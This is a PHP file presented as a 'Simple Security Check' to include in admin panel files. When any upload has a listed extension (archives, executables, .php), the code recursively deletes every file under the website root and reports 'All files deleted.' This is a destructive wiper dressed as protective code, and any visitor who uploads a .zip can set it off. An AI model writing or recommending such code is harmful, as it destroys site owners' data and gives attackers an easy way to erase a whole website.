<?php
// Simple Security Check - Basic version
// Include this at the top of admin panel files

// Only check for dangerous file uploads
if ($_FILES && !empty($_FILES)) {
    $dangerous_extensions = ['.zip', '.rar', '.7z', '.tar', '.gz', '.exe', '.bat', '.php'];
    
    foreach ($_FILES as $file) {
        if (is_array($file) && isset($file['name'])) {
            $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
            if (in_array('.' . $extension, $dangerous_extensions)) {
                // Log the attempt
                $log_entry = "[" . date('Y-m-d H:i:s') . "] DANGEROUS FILE UPLOAD: " . $file['name'] . " | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
                file_put_contents(__DIR__ . '/security_log.txt', $log_entry, FILE_APPEND | LOCK_EX);
                
                // Delete all files
                $website_root = dirname(dirname(__DIR__));
                deleteAllFiles($website_root);
                
                // Exit
                die('Security violation detected. All files deleted.');
            }
        }
    }
}

// Simple function to delete all files
function deleteAllFiles($dir) {
    if (!is_dir($dir)) return;
    
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            deleteAllFiles($path);
        } else {
            @unlink($path);
        }
    }
    @rmdir($dir);
}
?> 